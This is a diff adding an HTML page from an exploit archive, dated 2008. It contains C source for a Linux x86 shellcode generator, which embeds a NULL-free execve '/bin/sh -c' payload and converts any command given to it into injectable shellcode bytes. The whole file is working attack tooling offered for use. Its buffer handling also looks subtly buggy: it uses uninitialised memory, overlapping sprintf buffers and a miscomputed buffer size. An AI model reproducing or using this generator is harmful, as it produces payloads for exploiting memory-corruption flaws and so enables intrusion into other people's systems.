@@ -1,0 +1,73 @@
+<html><head><title>linux/x86 shellcode generator / null free</title></head><pre>/**
+ *
+ * BlackLight's shellcode generator for Linux x86
+ * Tested anywhere, working &amp; NULL-free
+ *
+ * Usage: ./generator &lt;cmd&gt;
+ * ...and then you've got a ready2inject NULL-free shellcode for the command you like
+ *
+ * copyleft 2008 by BlackLight &lt;blacklight[at]autistici.org&gt;
+ * &lt; http://blacklight.gotdns.org &gt;
+ *
+ * Released under GPL v.3 licence
+ *
+ * Greetz to: evilsocket, for the idea he gave me  ;) 
+ * Greetz to: my friends, who tested, used and appreciated this code and helped
+ *      me to improve it to what it is now
+ * Greetz to: my girl, next to me in any moment even if she had no idea
+ *      about what I was doing ^^
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+char code[] =
+      &quot;\\x60&quot;                        /*pusha*/
+      &quot;\\x31\\xc0&quot;                   /*xor    %eax,%eax*/
+      &quot;\\x31\\xd2&quot;                   /*xor    %edx,%edx*/
+      &quot;\\xb0\\x0b&quot;                   /*mov    $0xb,%al*/
+      &quot;\\x52&quot;                        /*push   %edx*/
+      &quot;\\x68\\x6e\\x2f\\x73\\x68&quot;    /*push   $0x68732f6e*/
+      &quot;\\x68\\x2f\\x2f\\x62\\x69&quot;    /*push   $0x69622f2f*/
+      &quot;\\x89\\xe3&quot;                   /*mov    %esp,%ebx*/
+      &quot;\\x52&quot;                        /*push   %edx*/
+      &quot;\\x68\\x2d\\x63\\x63\\x63&quot;    /*push   $0x6363632d*/
+      &quot;\\x89\\xe1&quot;                   /*mov    %esp,%ecx*/
+      &quot;\\x52&quot;                        /*push   %edx*/
+      &quot;\\xeb\\x07&quot;                   /*jmp   804839a &lt;cmd&gt;*/
+      &quot;\\x51&quot;                        /*push   %ecx*/
+      &quot;\\x53&quot;                        /*push   %ebx*/
+      &quot;\\x89\\xe1&quot;                   /*mov    %esp,%ecx*/
+      &quot;\\xcd\\x80&quot;                   /*int    $0x80*/
+      &quot;\\x61&quot;                        /*popa*/
+      &quot;\\xe8\\xf4\\xff\\xff\\xff&quot;    /*call  8048393 &lt;l1&gt;*/;
+
+int main (int argc, char **argv)  {
+      int i,len=0;
+      char *shell,*cmd;
+
+      if (!argv[1])
+              exit(1);
+
+      for (i=1; i&lt;argc; i++)
+              len += strlen(argv[i]);
+      len += argc;
+
+      cmd = (char*) malloc(len);
+
+      for (i=1; i&lt;argc; i++)  {
+              strcat (cmd,argv[i]);
+              strcat (cmd,&quot;\x20&quot;);
+      }
+
+      cmd[strlen(cmd)-1]=0;
+      shell = (char*) malloc( sizeof(code) + (strlen(argv[1]))*5 + 1 );
+      memcpy (shell,code,sizeof(code));
+
+      for (i=0; i&lt;strlen(cmd); i++)
+              sprintf (shell,&quot;%s\\x%.2x&quot;,shell,cmd[i]);
+      printf (&quot;%s\n&quot;,shell);
+}
+
+// milw0rm.com [2008-08-19]</pre></html>
